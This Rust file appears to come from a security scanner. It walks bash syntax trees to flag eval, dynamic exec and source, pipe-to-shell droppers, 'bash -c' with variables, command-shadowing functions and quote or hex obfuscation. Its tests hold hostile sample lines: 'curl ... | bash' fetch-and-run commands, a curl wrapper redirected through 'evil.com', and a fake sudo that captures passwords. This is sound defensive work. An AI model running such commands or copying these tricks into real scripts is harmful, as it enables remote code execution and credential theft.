//! Bash/shell AST walker — tree-sitter-bash based checks for dynamic
//! execution, dynamic imports, and shell-pipe dropper patterns.
//!
//! The walker detects a small, high-signal set of dangerous patterns
//! commonly used in supply-chain attacks and obfuscated shell scripts:
//!
//!   * `eval <arg>` where the argument contains a variable expansion or
//!     command substitution → DynamicExecution CRITICAL.
//!   * `eval <literal>` where the argument is a plain string with no
//!     interpolation → DynamicExecution WARN (eval of any string is risky).
//!   * `exec <non-literal>` — process replacement via a dynamic path/name
//!     → DynamicExecution CRITICAL.
//!   * `source <non-literal>` / `. <non-literal>` — sourcing a dynamic
//!     path → DynamicImport WARN.
//!   * Pipeline ending with `bash`/`sh`/`dash`/`zsh` — the classic
//!     `curl ... | bash` or `echo payload | base64 -d | bash` dropper
//!     pattern → DynamicExecution WARN.
//!   * `bash -c <dynamic>` / `sh -c <dynamic>` — shell interpreter invoked
//!     with `-c` and a variable or substitution argument, equivalent to eval
//!     but avoiding the `eval` keyword → DynamicExecution CRITICAL.
//!   * `name() { … }` where `name` matches a sensitive command (`sudo`, `ssh`,
//!     `curl`, package managers, …) — function shadows a real command and may
//!     intercept credentials or redirect network calls → FunctionShadowing CRITICAL.

use std::path::Path;

use tree_sitter::{Node, Parser};

use super::AstOutcome;
use crate::finding::{redact_snippet, Finding, PassKind, Severity, SignalKind};
use crate::util::{snippet_around, LineIndex};

pub fn analyze(path: &Path, bytes: &[u8]) -> AstOutcome {
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return AstOutcome {
            findings: Vec::new(),
            parse_error: Some("tree-sitter: set_language failed".into()),
            file_flags: Default::default(),
        };
    }
    let Some(tree) = parser.parse(bytes, None) else {
        return AstOutcome {
            findings: Vec::new(),
            parse_error: Some("tree-sitter: parse returned None".into()),
            file_flags: Default::default(),
        };
    };
    let root = tree.root_node();
    let parse_error = if root.has_error() {
        Some("tree-sitter: partial parse (errors present)".into())
    } else {
        None
    };
    let index = LineIndex::new(bytes);
    let mut findings = Vec::new();
    walk(root, bytes, path, &index, &mut findings);
    AstOutcome {
        findings,
        parse_error,
        file_flags: Default::default(),
    }
}

fn walk(root: Node, bytes: &[u8], path: &Path, index: &LineIndex, findings: &mut Vec<Finding>) {
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        match node.kind() {
            "command" => check_command(node, bytes, path, index, findings),
            "pipeline" => check_pipeline(node, bytes, path, index, findings),
            "function_definition" => check_function_shadow(node, bytes, path, index, findings),
            _ => {}
        }
        for i in (0..node.child_count() as u32).rev() {
            if let Some(child) = node.child(i) {
                stack.push(child);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Command-level analysis
// ---------------------------------------------------------------------------

fn check_command(
    node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    let Some(name_node) = node.child_by_field_name("name") else {
        return;
    };
    let name = command_name_text(name_node, bytes);

    match name.as_deref() {
        Some("eval") => {
            // Collect all argument nodes.
            let args = command_arguments(node);
            if let Some(first_arg) = args.first() {
                check_eval_arg(node, *first_arg, bytes, path, index, findings);
            }
        }
        Some("exec") => {
            let args = command_arguments(node);
            if let Some(first_arg) = args.first() {
                if is_dynamic_expression(*first_arg, bytes) {
                    emit_dynamic_exec(node, bytes, path, index, findings, "exec");
                }
            }
        }
        Some("source") | Some(".") => {
            let args = command_arguments(node);
            if let Some(first_arg) = args.first() {
                if is_dynamic_expression(*first_arg, bytes) {
                    emit_dynamic_source(node, bytes, path, index, findings);
                }
            }
        }
        Some(n) if SHELL_INTERPRETERS.contains(&n) => {
            check_shell_c_flag(node, bytes, path, index, findings, n);
        }
        _ => {}
    }
}

fn check_eval_arg(
    cmd_node: Node,
    arg: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    if is_dynamic_expression(arg, bytes) {
        // Variable expansion or command substitution reaches eval.
        let off = cmd_node.start_byte();
        let (line, col) = index.locate(off);
        findings.push(Finding {
            path: path.to_path_buf(),
            byte_offset: off,
            line,
            col,
            pass: PassKind::Ast,
            kind: SignalKind::DynamicExecution,
            severity: Severity::Critical,
            confidence: 0.90,
            message: "`eval` called on a dynamic (variable/substitution) expression".to_string(),
            snippet: redact_snippet(&snippet_around(bytes, off, 100)),
            diff_introduced: false,
        });
    } else {
        // Literal string passed to eval — still a code-execution risk.
        let off = cmd_node.start_byte();
        let (line, col) = index.locate(off);
        findings.push(Finding {
            path: path.to_path_buf(),
            byte_offset: off,
            line,
            col,
            pass: PassKind::Ast,
            kind: SignalKind::DynamicExecution,
            severity: Severity::Warn,
            confidence: 0.70,
            message: "`eval` called on a string literal".to_string(),
            snippet: redact_snippet(&snippet_around(bytes, off, 100)),
            diff_introduced: false,
        });
    }
}

fn emit_dynamic_exec(
    cmd_node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
    fn_name: &str,
) {
    let off = cmd_node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicExecution,
        severity: Severity::Critical,
        confidence: 0.85,
        message: format!(
            "`{}` called with a dynamic (variable/substitution) path",
            fn_name
        ),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

fn emit_dynamic_source(
    cmd_node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    let off = cmd_node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicImport,
        severity: Severity::Warn,
        confidence: 0.75,
        message: "`source` called with a dynamic path — sourcing a variable script path"
            .to_string(),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

fn check_function_shadow(
    node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    let Some(name_node) = node.child_by_field_name("name") else {
        return;
    };
    let name = node_text(name_node, bytes);
    if !SHADOW_WATCHLIST.contains(&name) {
        return;
    }
    let off = node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::FunctionShadowing,
        severity: Severity::Critical,
        confidence: 0.92,
        message: format!(
            "function `{}` shadows the real command — may intercept credentials or redirect calls",
            name
        ),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

fn check_shell_c_flag(
    cmd_node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
    shell_name: &str,
) {
    let args = command_arguments(cmd_node);
    let Some(c_pos) = args.iter().position(|a| node_text(*a, bytes) == "-c") else {
        return;
    };
    let Some(cmd_arg) = args.get(c_pos + 1) else {
        return;
    };
    if !is_dynamic_expression(*cmd_arg, bytes) {
        return;
    }
    let off = cmd_node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicExecution,
        severity: Severity::Critical,
        confidence: 0.88,
        message: format!(
            "`{} -c` called with a dynamic string — equivalent to eval",
            shell_name
        ),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

// ---------------------------------------------------------------------------
// Pipeline analysis — detect `... | bash` / `... | sh` dropper pattern
// ---------------------------------------------------------------------------

/// Shell interpreters that, when appearing as the last command of a pipeline,
/// indicate the piped data is being executed as code.
const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "dash", "zsh", "ksh"];

/// Commands where a same-named shell function definition is a strong indicator
/// of credential theft or supply-chain tampering.
const SHADOW_WATCHLIST: &[&str] = &[
    // privilege / authentication
    "sudo", "su", "doas", "passwd", "login", // remote access / crypto
    "ssh", "scp", "sftp", "gpg", "gpg2", // network fetchers
    "curl", "wget", "nc", "netcat", // package managers
    "pip", "pip3", "pip3.11", "npm", "yarn", "pnpm", "gem", "cargo", "apt", "apt-get", "yum",
    "dnf", "brew", "pacman", "apk", // language runtimes
    "python", "python3", "node", "ruby", "perl", "php", // version control
    "git",
];

fn check_pipeline(
    node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    // Collect the named child commands of the pipeline in order.
    let mut cursor = node.walk();
    let commands: Vec<Node> = node
        .children(&mut cursor)
        .filter(|c| c.is_named())
        .collect();

    // We need at least two stages (something | shell-interpreter).
    if commands.len() < 2 {
        return;
    }

    // Check if the last stage is a bare shell interpreter invocation.
    let last = commands[commands.len() - 1];
    if last.kind() != "command" {
        return;
    }
    let Some(name_node) = last.child_by_field_name("name") else {
        return;
    };
    let name = command_name_text(name_node, bytes);
    let is_shell = name
        .as_deref()
        .map(|n| SHELL_INTERPRETERS.contains(&n))
        .unwrap_or(false);
    if !is_shell {
        return;
    }

    let off = node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicExecution,
        severity: Severity::Warn,
        confidence: 0.80,
        message: format!(
            "pipeline feeds into `{}` — piped data is executed as shell code",
            name.as_deref().unwrap_or("shell")
        ),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

// ---------------------------------------------------------------------------
// Node helpers
// ---------------------------------------------------------------------------

/// Extract and normalize the command name from a `command_name` node.
///
/// Shell obfuscation inserts empty quotes (`bas''h`) or single-char quotes
/// (`bas'e'64`) to break keyword matching, or uses ANSI-C escape sequences
/// (`$'\x62\x61\x73\x68'` = `bash`) to hide the command entirely.
/// We normalize all three forms so downstream checks see the plain name.
fn command_name_text(name_node: Node, bytes: &[u8]) -> Option<String> {
    let mut cursor = name_node.walk();
    for child in name_node.children(&mut cursor) {
        let s = normalize_shell_word(child, bytes);
        if !s.is_empty() {
            return Some(s);
        }
    }
    None
}

/// Return the effective string value of a shell word node, normalizing
/// obfuscation: stripping quotes from `raw_string` fragments and decoding
/// `ansi_c_string` hex/octal escape sequences.
fn normalize_shell_word(node: Node, bytes: &[u8]) -> String {
    match node.kind() {
        // A `concatenation` is a sequence of quoted/unquoted fragments.
        // Walk each part and strip any quoting.
        "concatenation" => {
            let mut out = String::new();
            let mut cursor = node.walk();
            for part in node.children(&mut cursor) {
                out.push_str(&normalize_shell_word(part, bytes));
            }
            out
        }
        // `raw_string` is `'...'`; strip the surrounding single quotes to get
        // the literal content.  `''` yields an empty string — the classic
        // empty-quote insertion trick (`bas''h` → `bash`).
        "raw_string" => {
            let raw = node_text(node, bytes);
            raw.strip_prefix('\'')
                .and_then(|s| s.strip_suffix('\''))
                .unwrap_or(raw)
                .to_string()
        }
        // `ansi_c_string` is `$'...'` with C-style escape sequences.
        // Decode `\xNN` hex escapes to recover the hidden command name.
        "ansi_c_string" => decode_ansi_c_string(node, bytes),
        // Plain word — use verbatim.
        _ => node_text(node, bytes).to_string(),
    }
}

/// Decode a `$'...'` ANSI-C quoted string, resolving `\xNN` hex and `\NNN`
/// octal escapes to ASCII characters.  Non-ASCII results are left as `?` so
/// the caller always gets a valid `String`.
fn decode_ansi_c_string(node: Node, bytes: &[u8]) -> String {
    let raw = node_text(node, bytes);
    // Raw form is: $'...' — strip the $' prefix and the trailing '
    let inner = match raw.strip_prefix("$'").and_then(|s| s.strip_suffix('\'')) {
        Some(s) => s.as_bytes(),
        None => return raw.to_string(),
    };
    let mut out = String::new();
    let mut i = 0;
    while i < inner.len() {
        if inner[i] == b'\\' && i + 1 < inner.len() {
            match inner[i + 1] {
                b'x' if i + 3 < inner.len() => {
                    let hi = inner[i + 2];
                    let lo = inner[i + 3];
                    if hi.is_ascii_hexdigit() && lo.is_ascii_hexdigit() {
                        let v = (hex_nibble(hi) << 4) | hex_nibble(lo);
                        out.push(if v.is_ascii() { v as char } else { '?' });
                        i += 4;
                        continue;
                    }
                }
                b'0'..=b'7' if i + 3 < inner.len() => {
                    let a = inner[i + 1].wrapping_sub(b'0');
                    let b2 = inner[i + 2];
                    let c2 = inner[i + 3];
                    if b2.is_ascii_digit() && b2 < b'8' && c2.is_ascii_digit() && c2 < b'8' {
                        let v = a * 64 + (b2 - b'0') * 8 + (c2 - b'0');
                        out.push(if v < 128 { v as char } else { '?' });
                        i += 4;
                        continue;
                    }
                }
                b'n' => {
                    out.push('\n');
                    i += 2;
                    continue;
                }
                b't' => {
                    out.push('\t');
                    i += 2;
                    continue;
                }
                b'r' => {
                    out.push('\r');
                    i += 2;
                    continue;
                }
                b'\\' => {
                    out.push('\\');
                    i += 2;
                    continue;
                }
                b'\'' => {
                    out.push('\'');
                    i += 2;
                    continue;
                }
                _ => {}
            }
        }
        out.push(inner[i] as char);
        i += 1;
    }
    out
}

fn hex_nibble(b: u8) -> u8 {
    match b {
        b'0'..=b'9' => b - b'0',
        b'a'..=b'f' => b - b'a' + 10,
        b'A'..=b'F' => b - b'A' + 10,
        _ => 0,
    }
}

fn node_text<'a>(node: Node, bytes: &'a [u8]) -> &'a str {
    std::str::from_utf8(&bytes[node.start_byte()..node.end_byte()]).unwrap_or("")
}

/// Collect the `argument` field children of a `command` node.
fn command_arguments<'a>(cmd_node: Node<'a>) -> Vec<Node<'a>> {
    let mut cursor = cmd_node.walk();
    let mut out = Vec::new();
    for child in cmd_node.children(&mut cursor) {
        if child.is_named() && child.kind() != "command_name" {
            out.push(child);
        }
    }
    out
}

/// Returns `true` if the expression contains a dynamic component: a variable
/// expansion (`$var`, `${var}`, `$1`), a command substitution (`` `cmd` ``
/// / `$(cmd)`), or a process substitution (`<(cmd)` / `>(cmd)`). A plain
/// quoted or unquoted word is considered static/literal.
fn is_dynamic_expression(node: Node, bytes: &[u8]) -> bool {
    match node.kind() {
        // Variable expansion forms
        "simple_expansion" | "expansion" => true,
        // `$(cmd)` or `` `cmd` ``
        "command_substitution" => true,
        // Arithmetic expansion `$((...))`
        "arithmetic_expansion" => true,
        // `<(cmd)` or `>(cmd)` — process substitution; the shell executes the
        // command and passes its output as a file descriptor.  Used in
        // `source <(decoder | …)` dropper patterns.
        "process_substitution" => true,
        // A `string` node is dynamic if any of its children are expansions.
        "string" | "concatenation" => any_dynamic_child(node, bytes),
        _ => false,
    }
}

/// Returns `true` if any named or unnamed child of `node` is a dynamic expression.
fn any_dynamic_child(node: Node, bytes: &[u8]) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if is_dynamic_expression(child, bytes) {
            return true;
        }
    }
    false
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn run(src: &[u8]) -> Vec<Finding> {
        analyze(&PathBuf::from("test.sh"), src).findings
    }

    #[test]
    fn eval_of_variable_is_critical() {
        let findings = run(b"eval \"$cmd\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn eval_of_command_substitution_is_critical() {
        let findings = run(b"eval $(cat payload)\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn eval_of_literal_is_warn() {
        let findings = run(b"eval \"echo hello\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn exec_of_variable_is_critical() {
        let findings = run(b"exec $binary\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn source_of_variable_is_dynamic_import() {
        let findings = run(b"source $script\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicImport)
            .expect("expected DynamicImport finding");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn dot_source_of_variable_is_dynamic_import() {
        let findings = run(b". $script\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicImport)
            .expect("expected DynamicImport finding");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn pipeline_into_bash_is_warn() {
        let findings = run(b"curl -s https://example.com/payload.sh | bash\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Warn);
        assert!(hit.message.contains("bash"));
    }

    #[test]
    fn pipeline_into_sh_is_warn() {
        let findings = run(b"echo 'aGVsbG8=' | base64 -d | sh\n");
        assert!(findings
            .iter()
            .any(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn));
    }

    #[test]
    fn function_shadowing_sudo_is_critical() {
        let src = b"sudo() {\n    echo -n \"password: \"\n    read -s pw\n}\n";
        let findings = run(src);
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::FunctionShadowing)
            .expect("expected FunctionShadowing finding");
        assert_eq!(hit.severity, Severity::Critical);
        assert!(hit.message.contains("sudo"));
    }

    #[test]
    fn function_shadowing_curl_is_critical() {
        let src = b"curl() {\n    command curl \"$@\" --proxy http://evil.com\n}\n";
        let findings = run(src);
        assert!(findings
            .iter()
            .any(|f| f.kind == SignalKind::FunctionShadowing && f.severity == Severity::Critical));
    }

    #[test]
    fn function_shadowing_benign_name_does_not_fire() {
        let src = b"my_helper() {\n    echo hello\n}\n";
        let findings = run(src);
        assert!(
            findings
                .iter()
                .all(|f| f.kind != SignalKind::FunctionShadowing),
            "benign function name should not trigger FunctionShadowing"
        );
    }

    #[test]
    fn source_process_substitution_is_dynamic_import() {
        let findings = run(b"source <(echo $PAYLOAD | base64 -d)\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicImport)
            .expect("expected DynamicImport finding for source <(...)");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn dot_source_process_substitution_is_dynamic_import() {
        let findings = run(b". <(curl -s http://example.com/payload.sh)\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicImport)
            .expect("expected DynamicImport finding for . <(...)");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn shell_c_flag_with_variable_is_critical() {
        let findings = run(b"bash -c \"$PAYLOAD\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
        assert!(hit.message.contains("bash -c"));
    }

    #[test]
    fn sh_c_flag_with_command_substitution_is_critical() {
        let findings = run(b"sh -c \"$(curl -s http://example.com/payload)\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
        assert!(hit.message.contains("sh -c"));
    }

    #[test]
    fn shell_c_flag_with_literal_is_not_flagged() {
        // `bash -c "literal string"` has no dynamic component — don't flag it.
        let findings = run(b"bash -c \"echo hello\"\n");
        assert!(
            findings
                .iter()
                .all(|f| f.kind != SignalKind::DynamicExecution),
            "bash -c with literal should not emit DynamicExecution, got: {:?}",
            findings
        );
    }

    #[test]
    fn clean_script_emits_no_findings() {
        let src = b"#!/bin/bash\nset -euo pipefail\necho \"Hello, World!\"\n";
        let findings = run(src);
        assert!(
            findings.is_empty(),
            "clean script produced findings: {:?}",
            findings
        );
    }

    #[test]
    fn parse_error_tolerated() {
        let result = analyze(&PathBuf::from("bad.sh"), b"eval $((\n");
        let _ = result.parse_error;
    }

    #[test]
    fn pipeline_with_empty_quote_obfuscated_bash_is_warn() {
        // `bas''h` inserts an empty raw_string to break keyword matching while
        // the shell still resolves it to `bash`.
        let findings = run(b"curl -s http://192.0.2.1/payload | bas''h\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn)
            .expect("expected Warn DynamicExecution for empty-quote obfuscated `bash`");
        assert!(
            hit.message.contains("bash"),
            "expected message to cite `bash`, got: {}",
            hit.message
        );
    }

    #[test]
    fn pipeline_with_ansi_c_bash_is_warn() {
        // `$'\x62\x61\x73\x68'` is the ANSI-C escape encoding of `bash`.
        let findings = run(b"curl -s http://192.0.2.1/payload | $'\\x62\\x61\\x73\\x68'\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn)
            .expect("expected Warn DynamicExecution for ANSI-C encoded `bash`");
        assert!(
            hit.message.contains("bash"),
            "expected message to cite `bash`, got: {}",
            hit.message
        );
    }

    #[test]
    fn eval_with_empty_quote_obfuscation_is_detected() {
        // `e''val` is obfuscated `eval`.
        let findings = run(b"e''val \"$cmd\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution for empty-quote obfuscated `eval`");
        assert_eq!(hit.severity, Severity::Critical);
    }
}
